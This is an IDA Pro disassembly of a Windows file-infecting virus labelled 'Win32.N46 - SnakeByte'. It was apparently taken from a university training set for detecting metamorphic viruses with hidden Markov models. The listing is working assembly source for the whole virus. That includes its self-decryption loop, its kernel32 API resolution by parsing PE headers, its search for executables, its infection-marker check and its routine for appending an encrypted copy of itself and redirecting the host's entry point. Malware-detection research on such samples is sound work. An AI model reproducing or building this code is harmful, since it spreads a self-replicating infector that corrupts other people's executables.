

;
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º	This file is generated by The Interactive Disassembler (IDA)	    º
; º	Copyright (c) 2003 by DataRescue sa/nv,	<ida@datarescue.com>	    º
; º Licensed to: Mark Stamp, San Jose State University,	1 user,	academic, 11/2003 º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; File Name   :	C:\Documents and Settings\Fiona\My Documents\CS	298_Metamorphic	virus\HMM\TrainSet\N46.EXE
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00044000 ( 278528.)
; Section size in file		: 00043A00 ( 276992.)
; Offset to raw	data for section: 00000600
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?

		model flat

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Execute
CODE		segment	para public 'CODE' use32
		assume cs:CODE
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

		public start
start:
		nop
		nop
		nop

		nop
		nop
		nop

loc_444179:				; DATA XREF: sub_444868+123r
		call	loc_444184
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
word_44417E	dw 0			; DATA XREF: CODE:00444184o
					; CODE:004441B0r ...
		dd 0D2B5Bh
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_444184:				; CODE XREF: CODE:00444179p
		sub	dword ptr [esp], offset	word_44417E
		mov	ebx, [esp]
		add	esp, 4
		and	ebp, 0
		add	ebp, ebx
		mov	esi, ebp
		cmp	esi, 0
		jz	short loc_4441C2
		mov	ecx, ebp
		add	ecx, offset loc_4441C2
		mov	ebx, 403h

loc_4441AA:				; CODE XREF: CODE:004441C0j
		mov	ax, [ecx]
		not	ax
		sub	ax, ss:word_44417E[ebp]
		mov	[ecx], ax
		add	ecx, 2
		sub	ebx, 1
		jnz	short loc_4441AA

loc_4441C2:				; CODE XREF: CODE:0044419Bj
					; DATA XREF: CODE:0044419Fo
		jmp	loc_444585

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4441C7	proc near		; CODE XREF: CODE:004446CAp
		call	sub_44471B
		jb	short locret_44423B
		mov	eax, 9AA6h
		sub	eax, 9AA6h
		add	eax, ss:dword_444543[ebp]
		cmp	word ptr [eax],	5A4Dh
		jz	short loc_4441F8
		mov	edx, 0
		add	edx, 0C308h
		cmp	edx, 0C308h
		jz	short loc_444236

loc_4441F8:				; CODE XREF: sub_4441C7+1Cj
		cmp	word ptr [eax+3Ch], 0
		jz	short loc_444236
		push	0
		pop	edx
		add	edx, [eax+3Ch]
		cmp	ss:dword_444419[ebp], edx
		jb	short loc_444236
		add	edx, eax
		cmp	word ptr [edx],	4550h
		jz	short loc_444218
		jmp	short loc_444236
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_444218:				; CODE XREF: sub_4441C7+4Dj
		cmp	dword ptr [edx+4Ch], 4E3436h
		jz	short loc_444236
		mov	bx, [edx+16h]
		and	bx, 2
		cmp	bx, 2
		jnz	short loc_444236
		call	sub_444868
		jb	short locret_44423B

loc_444236:				; CODE XREF: sub_4441C7+2Fj
					; sub_4441C7+36j ...
		call	sub_44478E

locret_44423B:				; CODE XREF: sub_4441C7+5j
					; sub_4441C7+6Dj
		retn
sub_4441C7	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_44423C:				; CODE XREF: CODE:004445D5j
		push	ss:dword_444374[ebp]
		pop	ss:dword_44454B[ebp]
		push	ss:dword_444555[ebp]
		pop	ss:dword_44426B[ebp]
		push	ss:dword_444581[ebp]
		pop	ss:dword_444265[ebp]

loc_444260:				; CODE XREF: CODE:004446F4j
					; CODE:00444863j
		or	ebp, ebp
		jz	short loc_444271
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		db 0BBh	; »
dword_444265	dd 0			; DATA XREF: CODE:0044425Aw
					; CODE:004445A2w
		db 81h,	0C3h
dword_44426B	dd 0			; DATA XREF: CODE:0044424Ew
					; CODE:00444596w
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		push	ebx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_444271:				; CODE XREF: CODE:00444262j
		mov	ebx, 0
		push	ebx
		call	ExitProcess

loc_44427C:				; DATA XREF: CODE:004446A1o
		push	9
		pop	ecx
		mov	esi, offset dword_44455D
		add	esi, ebp
		lea	ebx, dword_44437C[ebp]

loc_44428C:				; CODE XREF: CODE:004442AEj
		mov	eax, ebx

loc_44428E:				; CODE XREF: CODE:00444292j
		inc	eax
		cmp	byte ptr [eax],	0
		jnz	short loc_44428E
		sub	eax, ebx
		call	loc_4447BD
		inc	ebx
		push	ebx
		add	[esp], eax
		pop	ebx
		push	ss:dword_444559[ebp]
		pop	edx
		mov	[esi], edx
		inc	esi
		add	esi, 3
		loop	loc_44428C
		lea	ecx, byte_4446AA[ebp]
		neg	edx
		push	ecx
		retn

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4442BA	proc near		; CODE XREF: sub_444868p
		pusha
		add	edx, ss:dword_444378[ebp]
		call	ss:dword_444569[ebp]
		xor	edx, eax
		push	edx
		pop	ss:dword_444378[ebp]
		popa
		retn
sub_4442BA	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4442D2	proc near		; CODE XREF: CODE:004446BFp
		call	sub_4442EE
		mov	edx, ebp
		add	edx, offset dword_4443F9
		push	edx
		push	esi
		call	ss:dword_444561[ebp]
		mov	ss:dword_444330[ebp], eax
		retn
sub_4442D2	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4442EE	proc near		; CODE XREF: sub_4442D2p sub_444304p
		pusha
		lea	esi, dword_444425[ebp]
		push	114h
		pop	edx

loc_4442FB:				; CODE XREF: sub_4442EE+12j
		mov	byte ptr [esi],	0
		inc	esi
		dec	edx
		jnz	short loc_4442FB
		popa
		retn
sub_4442EE	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_444304	proc near		; CODE XREF: CODE:004446DEp
		call	sub_4442EE
		mov	edi, offset dword_4443F9
		add	edi, ebp
		push	edi
		mov	ebx, 0
		add	ebx, ss:dword_444330[ebp]
		push	ebx
		call	ss:dword_444575[ebp]
		retn
sub_444304	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_444324	dd 0			; DATA XREF: CODE:0044469Bw
					; CODE:00444832r
dword_444328	dd 0			; DATA XREF: sub_444746+1Cw
					; sub_444746+2Fr ...
dword_44432C	dd 0			; DATA XREF: CODE:00444645w
					; CODE:0044465Cr
dword_444330	dd 0			; DATA XREF: sub_4442D2+15w
					; sub_444304+12r ...
		align 8
dword_444338	dd 0			; DATA XREF: CODE:004445AEw
					; CODE:004445B8w ...
word_44433C	dw 0			; DATA XREF: CODE:004447BEw
					; CODE:00444803w ...
aWin32_n46Snake	db 'Win32.N46 - SnakeByte',0
dword_444354	dd 0			; DATA XREF: CODE:0044467Bw
					; CODE:00444841r
dword_444358	dd 0			; DATA XREF: CODE:0044468Dw
					; CODE:004447C6r
dword_44435C	dd 0			; DATA XREF: sub_44471B+25w
					; sub_444746+10r ...
dword_444360	dd 0			; DATA XREF: sub_4446F9+Cr
					; sub_444868+36w ...
dword_444364	dd 0			; DATA XREF: sub_444868+4Aw
dword_444368	dd 0			; DATA XREF: CODE:004446B9w
					; CODE:004446D5r ...
dword_44436C	dd 0			; DATA XREF: sub_444868+BCw
dword_444370	dd 0			; DATA XREF: CODE:0044464Bw
					; CODE:00444665r ...
dword_444374	dd 0			; DATA XREF: CODE:0044423Cr
					; CODE:004445C8w ...
dword_444378	dd 0			; DATA XREF: sub_4442BA+1r
					; sub_4442BA+10w ...
dword_44437C	dd 616D6E55h		; DATA XREF: CODE:00444286r
aPviewoffile	db 'pViewOfFile',0
aFindfirstfilea	db 'FindFirstFileA',0
aClosehandle	db 'CloseHandle',0
aGettickcount	db 'GetTickCount',0
aCreatefilemapp	db 'CreateFileMappingA',0
aFindclose	db 'FindClose',0
aFindnextfilea	db 'FindNextFileA',0
aCreatefilea	db 'CreateFileA',0
aMapviewoffile	db 'MapViewOfFile',0
dword_4443F9	dd 8 dup(0)		; DATA XREF: sub_4442D2+7o
					; sub_444304+5o
dword_444419	dd 0			; DATA XREF: sub_4441C7+3Er
					; sub_444746r ...
		dd 2 dup(0)
dword_444425	dd 0			; DATA XREF: sub_4442EE+1r
					; sub_44471B+12o
		dd 45h dup(0)
		db 2 dup(0)
dword_44453F	dd 0			; DATA XREF: CODE:004447D9w
					; CODE:004447F9r
dword_444543	dd 0			; DATA XREF: sub_4441C7+11r
					; sub_444746+40w ...
dword_444547	dd 0			; DATA XREF: sub_4446F9+6r
					; sub_4446F9+1Aw ...
dword_44454B	dd 0			; DATA XREF: CODE:00444242w
dword_44454F	dd 58452E2Ah		; DATA XREF: CODE:004446ABo
		db 65h,	0
dword_444555	dd 0			; DATA XREF: CODE:00444248r
					; CODE:00444590r ...
dword_444559	dd 0			; DATA XREF: CODE:004442A1r
					; CODE:0044484Fw ...
dword_44455D	dd 0			; DATA XREF: CODE:0044427Fo
					; sub_4447A4+6r
dword_444561	dd 0			; DATA XREF: sub_4442D2+Fr
dword_444565	dd 0			; DATA XREF: sub_44478E+Er
					; sub_4447A4+12r
dword_444569	dd 0			; DATA XREF: sub_4442BA+7r
dword_44456D	dd 0			; DATA XREF: sub_444746+16r
dword_444571	dd 0			; DATA XREF: CODE:004446EEr
dword_444575	dd 0			; DATA XREF: sub_444304+19r
dword_444579	dd 0			; DATA XREF: sub_44471B+19r
dword_44457D	dd 0			; DATA XREF: sub_444746+35r
dword_444581	dd 0			; DATA XREF: CODE:00444254r
					; CODE:0044459Cr ...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_444585:				; CODE XREF: CODE:004441C2j
		pop	ebx
		mov	ecx, 0Bh
		sub	ecx, 7
		sub	esp, ecx
		mov	ecx, ss:dword_444555[ebp]
		mov	ss:dword_44426B[ebp], ecx
		mov	eax, ss:dword_444581[ebp]
		mov	ss:dword_444265[ebp], eax
		ror	ebx, 10h
		shl	ebx, 10h
		mov	ss:dword_444338[ebp], 54114h
		sub	ss:dword_444338[ebp], 1012h

loc_4445C2:				; CODE XREF: CODE:0044460Aj
		mov	edx, ss:dword_444338[ebp]
		adc	ss:dword_444374[ebp], 338473h
		cmp	edx, 0
		jz	loc_44423C
		movzx	eax, word ptr [ebx]
		xor	eax, 5A4Dh
		jz	short loc_44460C
		sub	ecx, 65A327h

loc_4445EB:				; CODE XREF: CODE:00444621j
					; CODE:00444640j
		mov	eax, 0
		add	eax, 10000h
		sub	ebx, eax
		mov	ecx, ss:dword_444338[ebp]
		dec	ecx
		mov	ss:dword_444338[ebp], ecx
		inc	ss:dword_444374[ebp]
		jmp	short loc_4445C2
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_44460C:				; CODE XREF: CODE:004445E3j
		add	ebx, 3Ch
		mov	eax, [ebx]
		add	ebx, 0FFFFFFC4h
		add	eax, ebx
		movzx	ecx, word ptr [eax]
		cmp	ecx, 4550h
		jz	short loc_444623
		jmp	short loc_4445EB
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_444623:				; CODE XREF: CODE:0044461Fj
		add	eax, 16h
		mov	ecx, 0F131h
		sub	ecx, 0F131h
		mov	cx, [eax]
		and	cx, 0F000h
		cmp	cx, 2000h
		jz	short loc_444642
		jmp	short loc_4445EB
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_444642:				; CODE XREF: CODE:0044463Ej
		add	eax, 0FFFFFFEAh
		mov	ss:dword_44432C[ebp], eax
		mov	ss:dword_444370[ebp], ebx
		mov	esi, 0F9B6h
		sub	esi, 0F9B6h
		add	esi, ss:dword_44432C[ebp]
		mov	ecx, [esi+78h]
		add	ecx, ss:dword_444370[ebp]
		sub	edx, ebx
		add	ecx, 1Ch
		mov	esi, [ecx]
		add	esi, ss:dword_444370[ebp]
		add	ecx, 4
		mov	ss:dword_444354[ebp], esi
		mov	esi, [ecx]
		add	esi, ss:dword_444370[ebp]
		dec	ecx
		add	ecx, 5
		mov	ss:dword_444358[ebp], esi
		mov	esi, [ecx]
		add	esi, ss:dword_444370[ebp]
		mov	ss:dword_444324[ebp], esi
		mov	edx, offset loc_44427C
		add	edx, ebp
		push	edx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
byte_4446AA	db 0BEh			; DATA XREF: CODE:004442B0r
		dd offset dword_44454F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		add	esi, ebp
		mov	eax, 2Fh
		sub	eax, 1Bh
		mov	ss:dword_444368[ebp], eax
		call	sub_4442D2
		inc	eax
		cmp	eax, 0
		jz	short loc_4446E8

loc_4446CA:				; CODE XREF: CODE:004446E6j
		call	sub_4441C7
		xor	ecx, 2ED64E2h
		cmp	ss:dword_444368[ebp], 0
		jz	short loc_4446E8
		call	sub_444304
		cmp	eax, 0
		jnz	short loc_4446CA

loc_4446E8:				; CODE XREF: CODE:004446C8j
					; CODE:004446DCj
		push	ss:dword_444330[ebp]
		call	ss:dword_444571[ebp]
		jmp	loc_444260

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4446F9	proc near		; CODE XREF: sub_444868+3Cp
					; sub_444868+E1p
		pusha
		mov	edx, 0
		mov	eax, ss:dword_444547[ebp]
		mov	ebx, ss:dword_444360[ebp]
		push	eax
		div	ebx
		sub	ebx, edx
		pop	eax
		add	eax, ebx
		mov	ss:dword_444547[ebp], eax
		popa
		retn
sub_4446F9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_44471B	proc near		; CODE XREF: sub_4441C7p
		sub	edx, edx
		push	edx
		push	edx
		push	3
		push	edx
		add	edx, 1
		push	edx
		push	0C0000000h
		mov	esi, ebp
		add	esi, offset dword_444425
		push	esi
		call	ss:dword_444579[ebp]
		add	eax, 1
		jz	short loc_4447A2
		dec	eax
		mov	ss:dword_44435C[ebp], eax
sub_44471B	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_444746	proc near		; CODE XREF: sub_444868+5Dp
		mov	ebx, ss:dword_444419[ebp]
		push	ebx
		push	0
		push	ebx
		push	0
		push	4
		push	0
		push	ss:dword_44435C[ebp]
		call	ss:dword_44456D[ebp]
		mov	ss:dword_444328[ebp], eax
		pop	ebx
		test	eax, eax
		jz	short loc_444796
		push	0
		pop	edx
		push	ebx
		push	edx
		push	edx
		push	2
		push	ss:dword_444328[ebp]
		call	ss:dword_44457D[ebp]
		cmp	eax, 0
		jz	short sub_44478E
		mov	ss:dword_444543[ebp], eax
		clc
		retn
sub_444746	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_44478E	proc near		; CODE XREF: sub_4441C7+6Fp
					; sub_444746+3Ej
		shl	ecx, 12h
		call	sub_4447A4

loc_444796:				; CODE XREF: sub_444746+25j
		push	ss:dword_44435C[ebp]
		call	ss:dword_444565[ebp]

loc_4447A2:				; CODE XREF: sub_44471B+22j
		stc
		retn
sub_44478E	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4447A4	proc near		; CODE XREF: sub_44478E+3p
					; sub_444868+51p
		push	ss:dword_444543[ebp]
		call	ss:dword_44455D[ebp]
		push	ss:dword_444328[ebp]
		call	ss:dword_444565[ebp]
		retn
sub_4447A4	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4447BD:				; CODE XREF: CODE:00444296p
		pusha
		and	ss:word_44433C[ebp], 0
		mov	ecx, ss:dword_444358[ebp]

loc_4447CC:				; CODE XREF: CODE:00444814j
		push	ecx
		mov	edx, [ecx]
		add	edx, ss:dword_444370[ebp]
		push	edx
		pop	ecx
		push	ecx
		pop	edi
		mov	ss:dword_44453F[ebp], eax
		push	edi
		push	ebx
		cld

loc_4447E2:				; CODE XREF: CODE:004447F5j
		mov	dl, [ebx]
		cmp	dl, [edi]
		jnz	short loc_4447F7
		dec	eax
		sub	eax, 0
		cmp	eax, 0
		jz	short loc_444818
		add	edi, 1
		inc	ebx
		jmp	short loc_4447E2
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4447F7:				; CODE XREF: CODE:004447E6j
		pop	ebx
		pop	edi
		mov	eax, ss:dword_44453F[ebp]
		pop	ecx
		add	ecx, 4
		add	ss:word_44433C[ebp], 1
		cmp	ss:word_44433C[ebp], 2004h
		jnz	short loc_4447CC
		jmp	short loc_444861
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_444818:				; CODE XREF: CODE:004447EFj
		add	esp, 4
		pop	ebx
		pop	ebx
		mov	edx, 25BBh
		sub	edx, 25BBh
		mov	dx, ss:word_44433C[ebp]
		clc
		rcl	edx, 1
		add	edx, ss:dword_444324[ebp]
		push	edx
		pop	ecx
		movzx	edx, word ptr [ecx]
		clc
		rcl	edx, 2
		add	edx, ss:dword_444354[ebp]
		mov	ecx, [edx]
		add	ecx, ss:dword_444370[ebp]
		mov	ss:dword_444559[ebp], 0
		add	ss:dword_444559[ebp], ecx
		popa
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_444861:				; CODE XREF: CODE:00444816j
		pop	esi
		popa
		jmp	loc_444260

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_444868	proc near		; CODE XREF: sub_4441C7+68p
		call	sub_4442BA
		mov	eax, ss:dword_444378[ebp]
		mov	ss:word_44417E[ebp], ax
		push	ss:dword_444543[ebp]
		pop	eax
		mov	edx, eax
		add	edx, [eax+3Ch]
		mov	eax, [edx+3Ch]
		mov	ecx, ss:dword_444419[ebp]
		add	ecx, 84Eh
		mov	ss:dword_444547[ebp], ecx
		ror	ebx, 0Bh
		mov	ss:dword_444360[ebp], eax
		call	sub_4446F9
		shl	edx, 9
		mov	ecx, ss:dword_444547[ebp]
		mov	ss:dword_444364[ebp], ecx
		pusha
		call	sub_4447A4
		popa
		mov	ss:dword_444419[ebp], ecx
		call	sub_444746
		jb	loc_4449C5
		push	ss:dword_444543[ebp]
		pop	esi
		mov	ecx, esi
		add	ecx, [esi+3Ch]
		push	ecx
		pop	esi
		inc	ss:dword_444374[ebp]
		movzx	ebx, word ptr [esi+6]
		add	ebx, 0FFFFFFFFh
		imul	ebx, 28h
		inc	ecx
		add	ecx, 77h
		add	ecx, ebx
		mov	edx, [esi+74h]
		shl	edx, 3
		add	ecx, edx
		mov	ebx, [esi+34h]
		mov	ss:dword_444555[ebp], ebx
		mov	edx, [esi+28h]
		mov	ss:dword_444581[ebp], edx
		mov	eax, [ecx+10h]
		mov	ebx, eax
		add	ecx, 14h
		add	eax, [ecx]
		sub	ecx, 14h
		push	eax
		push	ebx
		pop	edx
		add	edx, [ecx+0Ch]
		mov	[esi+28h], edx
		mov	ss:dword_44436C[ebp], edx
		mov	edx, [ecx+10h]
		push	edx
		add	edx, 84Eh
		mov	ss:dword_444547[ebp], edx
		push	dword ptr [esi+3Ch]
		pop	ss:dword_444360[ebp]
		and	ss:dword_444374[ebp], eax
		call	sub_4446F9
		mov	edx, ss:dword_444547[ebp]
		mov	[ecx+10h], edx
		pop	edx
		add	edx, 84Eh
		mov	dword ptr [ecx+8], 0
		add	[ecx+8], edx
		mov	edx, [ecx+0Ch]
		add	edx, [ecx+10h]
		mov	[esi+50h], edx
		or	dword ptr [ecx+24h], 0A0000020h
		mov	dword ptr [esi+4Ch], 4E3436h
		pop	edi
		add	edi, ss:dword_444543[ebp]
		mov	edx, 49h
		lea	esi, loc_444179[ebp]

loc_444991:				; CODE XREF: sub_444868+12Bj
		movsb
		dec	edx
		jnz	short loc_444991
		mov	edx, 403h

loc_44499A:				; CODE XREF: sub_444868+143j
		lodsw
		add	ax, ss:word_44417E[ebp]
		not	ax
		stosw
		sub	edx, 1
		jnz	short loc_44499A
		mov	ebx, ss:dword_444368[ebp]
		mov	edx, 0Fh
		sub	edx, 0Eh
		sub	ebx, edx
		mov	ss:dword_444368[ebp], ebx
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4449C5:				; CODE XREF: sub_444868+62j
		stc
		retn
sub_444868	endp

; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS KEYPAD	"+" TO EXPAND]
		dd 0Ch dup(0)
		align 4
		dd 180h	dup(?)
CODE		ends

; Section 2. (virtual address 00045000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00044000
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure data
; Segment permissions: Read/Write
DATA		segment	para public 'DATA' use32
		assume cs:DATA
		;org 445000h
		align 2000h
DATA		ends

;
; Imports from KERNEL32
;
; Section 3. (virtual address 00046000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00044000
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Externs
; _idata
; void __stdcall __imp_ExitProcess(UINT	uExitCode)
		extrn __imp_ExitProcess:dword ;	DATA XREF: ExitProcessr



		end start
